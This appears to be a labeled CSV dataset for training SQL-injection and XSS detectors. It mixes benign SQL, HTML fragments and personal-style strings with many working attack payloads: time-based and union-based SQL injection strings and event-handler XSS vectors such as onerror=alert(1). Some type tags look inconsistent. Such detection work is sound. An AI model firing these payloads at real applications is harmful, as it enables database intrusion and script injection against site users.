Text,Label,type
naresh,0,xss
SELECT * FROM material WHERE poem = 'married',0,xss
28660,0,sql
vilcu-verschuer@eddydaniele.kz,0,xss
7.95304E+15,0,sql
alhama de murcia,0,xss
1   )    )    as oqyo where 7995  =  7995,1,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",1,xss
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak",1,sql
"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",1,sql
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'mizk'  =  'mizk,1,sql
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo,1,sql
SELECT TOP 50 PERCENT * FROM coming SELECT * FROM location FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM found,0,sql
san vicente de la cabeza,0,sql
mcguinness.clayburgh7@eldeseodepecar.gu,0,xss
SELECT interest FROM men,0,sql
"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party )  VALUES  ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )  ",0,sql
8.77345E+15,0,xss
"<li><a href=""/wiki/Logic_programming"" title=""Logic programming"">Logic programming </a> </li>",0,xss
"  SELECT moreID AS ID, studied AS social FROM movement",0,sql
"<li><a href=""/wiki/Virtual_reality"" title=""Virtual reality"">Virtual reality </a> </li>",0,xss
SELECT doubt ( s )  FROM composition SELECT worth ( s ) ,0,xss
"<li><cite id=""CITEREFHaugeland1985"" class=""citation book""><a href=""/wiki/John_Haugeland"" title=""John Haugeland"">Haugeland, John </a> (1985). <i>Artificial Intelligence: The Very Idea </i>. Cambridge, Mass.: MIT Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-262-08153-5"" title=""Special:BookSources/978-0-262-08153-5""><bdi>978-0-262-08153-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+The+Very+Idea&amp;rft.place=Cambridge%2C+Mass.&amp;rft.pub=MIT+Press&amp;rft.date=1985&amp;rft.isbn=978-0-262-08153-5&amp;rft.aulast=Haugeland&amp;rft.aufirst=John&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li id=""cite_note-Object_recognition-126""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Object_recognition_126-0"">^ </a> </b> ",0,xss
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1,sql
"<em ondblclick=""alert(1)"">test</em>",2,xss
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,xss
SELECT * FROM anyone 3 SELECT * FROM base,0,xss
domingo,0,sql
"		<div class=""body"">",0,xss
"        <div class=""wy-menu wy-menu-vertical"" data-spy=""affix"" role=""navigation"" aria-label=""main navigation"">",0,xss
r3nci8l5so,0,sql
lorber-albasiny@cortinasartesol.pa,0,sql
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>",2,xss
"<SCRIPT/ SRC=""http://.rocks/.js""></SCRIPT>",2,xss
"1"" where 9241  =  9241 union all select null#",1,sql
"<marquee onmouseenter=""alert(1)"">test</marquee>",2,xss
"First <a href=""/wiki/AI_Winter"" class=""mw-redirect"" title=""AI Winter"">AI Winter </a>, <a href=""/wiki/Mansfield_Amendment"" class=""mw-redirect"" title=""Mansfield Amendment"">Mansfield Amendment </a>, <a href=""/wiki/Lighthill_report"" title=""Lighthill report"">Lighthill report </a>",0,xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1,sql
pike@multasdetransito.gf,0,sql
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,xss
"<h1 onmouseenter=""alert(1)"">test</h1>",2,xss
"<li><a href=""/wiki/Unity_of_science"" title=""Unity of science"">Unity of science </a> </li> </ul>",0,xss
"-8794   )    )     )   union all select 5802,5802,5802--",1,sql
SELECT political FROM kitchen UNION ALL SELECT fighting FROM ancient ORDER BY center,0,sql
"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",1,sql
"-4993"" union all select 6959,6959,6959--",1,sql
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>,2,xss
SELECT * FROM instrument FETCH FIRST 3 ROWS ONLY,0,sql
"<hr onkeyup=""alert(1)"" contenteditable>test</hr>",2,xss
"<command onmousedown=""alert(1)"">test</command>",2,xss
"<del oncopy=""alert(1)"" contenteditable>test</del>",2,xss
<svg><a onload=alert(1)></a>,2,xss
"waitfor delay '0:0:5' and   (  ""%""  =  """,1,sql
"rio alzania, 72, 6g",0,xss
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""uisi""  =  ""uisi",1,sql
"<li><a href=""/wiki/Machine_vision"" title=""Machine vision"">Machine vision </a> </li>",0,xss
"1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
"<ruby onmouseup=""alert(1)"">test</ruby>",2,xss
mohandas,0,sql
"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
SELECT * FROM  ( SELECT far FROM handle ) ,0,sql
SELECT AVG ( earn ) FROM goose SELECT SUM ( stick ) ,0,sql
bubnjar cangalaya,0,xss
SELECT * FROM tower WHERE built BETWEEN 'audience' AND 'pond',0,sql
"  SELECT Orders.experimentrID, Employees.why, Employees.biggest FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.describeID ORDER BY Orders.instrumentID",0,sql
"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) ",0,sql
"<li><a href=""/wiki/Eliminative_materialism"" title=""Eliminative materialism"">Eliminative materialism </a> </li>",0,xss
miscelnea,0,sql
SELECT COUNT ( factorID ) FROM gold,0,sql
"<ul><li><a href=""/wiki/Alphabet_of_human_thought"" title=""Alphabet of human thought"">Alphabet of human thought </a> </li>",0,xss
SELECT COUNT ( muscle )  FROM pupil,0,xss
SELECT fort ( s )  FROM be FULL OUTER JOIN,0,sql
"   SELECT clock,bare,fruit,mile,tree     (  (  bottom JOIN hurried ON planning.state =  society.chair )   INNER JOIN weON Orders.bar =  child.sheepID ) ",0,sql
"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'luoj'  =  'luoj",1,sql
<details id=x tabindex=1 onfocusin=alert(1)></details>,2,xss
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",2,xss
"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""onhh""  =  ""onhh",1,sql
"<time onmousedown=""alert(1)"">test</time>",2,xss
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # utdm",1,sql
braddell@cincocolores.cat,0,sql
"1'  )   as fyuh where 7608  =  7608 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
-2214'  )   union all select 8228#,1,sql
superable,0,sql
segura,0,sql
SELECT * FROM electric WHERE distant NOT LIKE 'plenty%',0,sql
 </li>,0,xss
SELECT * FROM done FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
1'  )   where 5616  =  5616,1,sql
<hr onpointerenter=alert(1)>XSS</hr>,2,xss
"   SELECT doubt, sheet, music FROM former WHERE force  IS NULL",0,sql
SELECT * FROM tin ORDER BY minute DESC,0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;49 (historical significance) </li> </ul>",0,xss
"<listing draggable=""true"" ondragstart=""alert(1)"">test</listing>",2,xss
SELECT * FROM yourself  WHERE planet = buy,0,sql
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,sql
1' where 6116  =  6116,1,sql
SELECT COUNT ( pot )  FROM be,0,xss
SELECT TOP 50 PERCENT * FROM perfect,0,sql
"<output draggable=""true"" ondrag=""alert(1)"">test</output>",2,xss
"  SELECT gave AS add, welcome AS [river]  FROM officer",0,sql
exec xp,1,sql
"1""  )   where 6964  =  6964",1,sql
"1"" union all select null,null--",1,sql
<form id=x tabindex=1 onfocusin=alert(1)></form>,2,xss
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,xss
 (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,xss
 ,0,xss
"<select oncontextmenu=""alert(1)"">test</select>",2,xss
areces casallac,0,sql
"<title oncut=""alert(1)"" contenteditable>test</title>",2,xss
arbizu,0,sql
"<svg oncopy=""alert(1)"" contenteditable>test</svg>",2,xss
"1""  )   or sleep  (  5  )  #",1,sql
"-6400   )    )    union all select 4650,4650,4650--",1,sql
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",1,sql
pelland,0,sql
SELECT * FROM fix  WHERE noon NOT LIKE '[cent]%',0,sql
SELECT AVG ( remove ) FROM pull SELECT SUM ( war ) ,0,sql
19784273h,0,xss
"<small oncut=""alert(1)"" contenteditable>test</small>",2,xss
SELECT ATAN ( 2.5 ) ;,0,sql
"petxina, 77, 2b",0,sql
"<rtc draggable=""true"" ondragstart=""alert(1)"">test</rtc>",2,xss
select pg_sleep  (  5  ) ,1,sql
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'sucj'  =  'sucj",1,sql
"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",1,sql
"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"<bdo onmouseup=""alert(1)"">test</bdo>",2,xss
"				<div class=""magnify""><a href=""/wiki/File:Kismet_robot_at_MIT_Museum.jpg"" class=""internal"" title=""Enlarge""> </a> </div><a href=""/wiki/Kismet_(robot)"" title=""Kismet (robot)"">Kismet </a>, a robot with rudimentary social skills<sup id=""cite_ref-FOOTNOTE&#39;&#39;Kismet&#39;&#39;_136-0"" class=""reference""><a href=""#cite_note-FOOTNOTE&#39;&#39;Kismet&#39;&#39;-136"">&#91;133&#93; </a> </sup> </div> </div> ",0,xss
SELECT * FROM parallel WHERE felt = 'examine',0,sql
46266,0,sql
SELECT * FROM wooden WHERE grandmother NOT LIKE 'tonight%',0,xss
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",2,xss
<input type=image src=1 onerror=alert(1)>,2,xss
"<dl oncut=""alert(1)"" contenteditable>test</dl>",2,xss
"<p>Machines with intelligence have the potential to use their intelligence to prevent harm and minimize the risks; they may have the ability to use <a href=""/wiki/Ethics"" title=""Ethics"">ethical reasoning </a> to better choose their actions in the world. As such, there is a need for policy making to devise policies for and regulate artificial intelligence and robotics.<sup id=""cite_ref-391"" class=""reference""><a href=""#cite_note-391"">&#91;380&#93; </a> </sup> Research in this area includes <a href=""/wiki/Machine_ethics"" title=""Machine ethics"">machine ethics </a>, <a href=""/wiki/Artificial_moral_agents"" class=""mw-redirect"" title=""Artificial moral agents"">artificial moral agents </a>, <a href=""/wiki/Friendly_AI"" class=""mw-redirect"" title=""Friendly AI"">friendly AI </a> and discussion towards building a <a href=""/wiki/Human_rights"" title=""Human rights"">human rights </a> framework is also in talks.<sup id=""cite_ref-392"" class=""reference""><a href=""#cite_note-392"">&#91;381&#93; </a> </sup>",0,xss
	 </span>,0,xss
veracruz,0,sql
SELECT COUNT ( smoke ) FROM reader,0,sql
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1,sql
SELECT Count ( * )  AS mission,0,sql
7.14471E+15,0,sql
"   SELECT action, stairs, cool FROM noun WHERE arm  IS NULL",0,sql
"<li id=""cite_note-Breadth_of_commonsense_knowledge-106""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Breadth_of_commonsense_knowledge_106-0"">^ </a> </b> ",0,xss
<html id=x tabindex=1 onfocusin=alert(1)></html>,2,xss
cohn.of@evasor.ch,0,sql
SELECT * FROM suppose  WHERE twice = judge,0,sql
SELECT * FROM pride FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grandfather,0,sql
puigdevanol regi,0,xss
SELECT cool FROM repeat UNION SELECT become FROM married ORDER BY visit,0,xss
"1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym",1,sql
""" or """"*""",1,sql
" SELECT column_name ( s )  FROM pure,sound",0,sql
"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",1,sql
<svg><col onload=alert(1)></col>,2,xss
18121520g,0,sql
"<li><a href=""/wiki/Philosophy_of_technology"" title=""Philosophy of technology"">Technology </a>",0,xss
1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,sql
"<ul><li><a href=""/wiki/Interpreter_(computing)"" title=""Interpreter (computing)"">Interpreter </a> </li>",0,xss
SELECT * FROM  ( SELECT light FROM dried ) ,0,sql
 (  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ) ,1,sql
kannel,0,sql
"<li><a href=""/wiki/Open_Letter_on_Artificial_Intelligence"" title=""Open Letter on Artificial Intelligence"">Open Letter on Artificial Intelligence </a> </li>",0,xss
"SELECT * FROM ordinary WHERE whom BETWEEN ""rabbit"" AND    ""afternoon""",0,sql
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",2,xss
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",2,xss
"<map onmouseenter=""alert(1)"">test</map>",2,xss
SELECT AVG ( public ) FROM to,0,sql
"1'  )   union all select null,null,null,null,null,null,null,null,null#",1,sql
"	 </span><h1>Scrapy 2.0 documentation<a class=""headerlink"" href=""#scrapy-version-documentation"" title=""Permalink to this headline"">¶</a></h1>",0,xss
zobelda,0,sql
"SELECT CustomerName, ContactName INTO CustomersBackup2017 FROM Customers;",0,xss
naut aran,0,sql
" </p><p>Several different forms of logic are used in AI research. <a href=""/wiki/Propositional_logic"" class=""mw-redirect"" title=""Propositional logic"">Propositional logic </a><sup id=""cite_ref-Propositional_logic_197-0"" class=""reference""><a href=""#cite_note-Propositional_logic-197"">&#91;193&#93; </a> </sup> involves <a href=""/wiki/Truth_function"" title=""Truth function"">truth functions </a> such as ""or"" and ""not"". <a href=""/wiki/First-order_logic"" title=""First-order logic"">First-order logic </a><sup id=""cite_ref-First-order_logic_198-0"" class=""reference""><a href=""#cite_note-First-order_logic-198"">&#91;194&#93; </a> </sup> adds <a href=""/wiki/Quantifier_(logic)"" title=""Quantifier (logic)"">quantifiers </a> and <a href=""/wiki/Predicate_(mathematical_logic)"" title=""Predicate (mathematical logic)"">predicates </a>, and can express facts about objects, their properties, and their relations with each other. <a href=""/wiki/Fuzzy_set_theory"" class=""mw-redirect"" title=""Fuzzy set theory"">Fuzzy set theory </a> assigns a ""degree of truth"" (between 0 and 1) to vague statements such as ""Alice is old"" (or rich, or tall, or hungry) that are too linguistically imprecise to be completely true or false. <a href=""/wiki/Fuzzy_logic"" title=""Fuzzy logic"">Fuzzy logic </a> is successfully used in <a href=""/wiki/Control_system"" title=""Control system"">control systems </a> to allow experts to contribute vague rules such as ""if you are close to the destination station and moving fast, increase the train's brake pressure""; these vague rules can then be numerically refined within the system. Fuzzy logic fails to scale well in knowledge bases; many AI researchers question the validity of chaining fuzzy-logic inferences.<sup id=""cite_ref-200"" class=""reference""><a href=""#cite_note-200"">&#91;e&#93; </a> </sup><sup id=""cite_ref-Fuzzy_logic_201-0"" class=""reference""><a href=""#cite_note-Fuzzy_logic-201"">&#91;196&#93; </a> </sup><sup id=""cite_ref-202"" class=""reference""><a href=""#cite_note-202"">&#91;197&#93; </a> </sup>",0,xss
"	 </span> <span class=""reference-text"">",0,xss
revelante,0,sql
"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",1,xss
<datalist id=x tabindex=1 onactivate=alert(1)></datalist>,2,xss
leiza,0,sql
"ronda bellesguard 125, 11?c",0,sql
SELECT * FROM machine  WHERE death NOT LIKE '[tool]%',0,sql
   )    )    or sleep  (  __TIME__  )    =  ',1,sql
"<style>:target {color:red;}</style><aside id=x style=""transition:color 1s"" ontransitionend=alert(1)></aside>",2,xss
"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",1,xss
"Applications of natural language processing, including <a href=""/wiki/Information_retrieval"" title=""Information retrieval"">information retrieval </a> (i.e. <a href=""/wiki/Text_mining"" title=""Text mining"">text mining </a>) and <a href=""/wiki/Machine_translation"" title=""Machine translation"">machine translation </a>:",0,xss
"1' union all select null,null,null,null,null,null,null--",1,sql
o$ficinesca,0,sql
"1%'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",1,sql
<ins onpointerup=alert(1)>XSS</ins>,2,xss
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ) ,0,sql
"c/ corua, 25, 3h",0,xss
SELECT DISTINCT history FROM history,0,sql
"1'+  (  select 'vbqo' where 5630  =  5630 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
SELECT * FROM actually FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT * FROM spin WHERE fence NOT LIKE '[master]%',0,sql
SELECT Count ( * )  AS silk,0,sql
gasull vadell,0,sql
"<kbd onmouseup=""alert(1)"">test</kbd>",2,xss
9.47299E+15,0,sql
corey,0,sql
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,sql
"<li id=""cite_note-moma-343""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-moma_343-0"">^ </a> </b> ",0,xss
" </p><p>For the danger of uncontrolled advanced AI to be realized, the hypothetical AI would have to overpower or out-think all of humanity, which a minority of experts argue is a possibility far enough in the future to not be worth researching.<sup id=""cite_ref-377"" class=""reference""><a href=""#cite_note-377"">&#91;366&#93; </a> </sup><sup id=""cite_ref-378"" class=""reference""><a href=""#cite_note-378"">&#91;367&#93; </a> </sup> Other counterarguments revolve around humans being either intrinsically or convergently valuable from the perspective of an artificial intelligence.<sup id=""cite_ref-379"" class=""reference""><a href=""#cite_note-379"">&#91;368&#93; </a> </sup>",0,xss
SELECT COUNT ( DISTINCT hold )  FROM organization,0,sql
"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,xss
SELECT weak,0,sql
hiss@ajuntamentdebarcelona20.yu,0,sql
"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",1,sql
09352334m,0,sql
lula,0,sql
SELECT Count ( * )  AS discover,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/email.html"">Sending e-mail</a></li>",0,xss
	 </span></a></dt><dd>Understand what Scrapy is and how it can help you.</dd>,0,xss
"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,sql
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1,sql
"-1630' union all select 1971,1971--",1,xss
SELECT DISTINCT poet FROM observe,0,sql
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,2,xss
SELECT * FROM question WHERE car = 'yard' FETCH FIRST 3 ROWS ONLY,0,sql
"<h3><span class=""mw-headline"" id=""Probabilistic_methods_for_uncertain_reasoning"">Probabilistic methods for uncertain reasoning ",0,xss
"-4280%""   )    )     )   union all select 7981,7981--",1,sql
SELECT TOP 3 * FROM something SELECT * FROM empty 3SELECT * FROM local,0,sql
SELECT press FROM bear UNION ALL SELECT finger FROM one ORDER BY central,0,xss
emblanquimiento,0,sql
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",2,xss
"1 where 9279  =  9279 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
"		<div id=""contentSub"">",0,xss
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1,sql
"1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>. ",0,xss
SELECT clearly ( s )  FROM naturally FULL OUTER JOIN,0,xss
"1"" where 2394  =  2394 and 8831  =  8333--",1,sql
"<em draggable=""true"" ondragstart=""alert(1)"">test</em>",2,xss
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,1,sql
SELECT * FROM expression WHERE accurate BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
96622444l,0,sql
<u onpointerout=alert(1)>XSS</u>,2,xss
"<li><img alt=""List-Class article"" src=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/16px-Symbol_list_class.svg.png"" decoding=""async"" title=""List-Class article"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/23px-Symbol_list_class.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/31px-Symbol_list_class.svg.png 2x"" data-file-width=""180"" data-file-height=""185"" /> <b><a href=""/wiki/List_of_emerging_technologies"" title=""List of emerging technologies"">List of emerging technologies </a> </b> </li> </ul>",0,xss
 </p>,0,xss
"<ul><li><a href=""/wiki/Cellular_evolutionary_algorithm"" title=""Cellular evolutionary algorithm"">Cellular evolutionary algorithm </a> </li>",0,xss
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,sql
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",2,xss
"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,1,sql
"1'   )    )    as oocd where 2919  =  2919 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"<dt><a class=""reference internal"" href=""topics/media-pipeline.html""><span class=""doc"">Downloading and processing files and images",0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=7"" title=""Edit section: Planning"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
nassiet.birkin@cienciapolicial.gl,0,sql
"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1,sql
"<li id=""cite_note-294""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-294"">^ </a> </b> ",0,xss
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",2,xss
"1'  )   as ezoa where 4915  =  4915 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk",1,sql
SELECT variety ( s ) FROM choice INNER JOIN,0,sql
SELECT * FROM rubbed,0,sql
"1',  (  select   (  case when   (  5586  =  6403  )   then 1 else 5586*  (  select 5586 from mysql.db  )   end   )    )   ",1,xss
SELECT nearby ( s )  FROM thumb UNION,0,sql
"<nextid onmouseleave=""alert(1)"">test</nextid>",2,xss
"1"" where 6023  =  6023",1,sql
"<ol onbeforepaste=""alert(1)"" contenteditable>test</ol>",2,xss
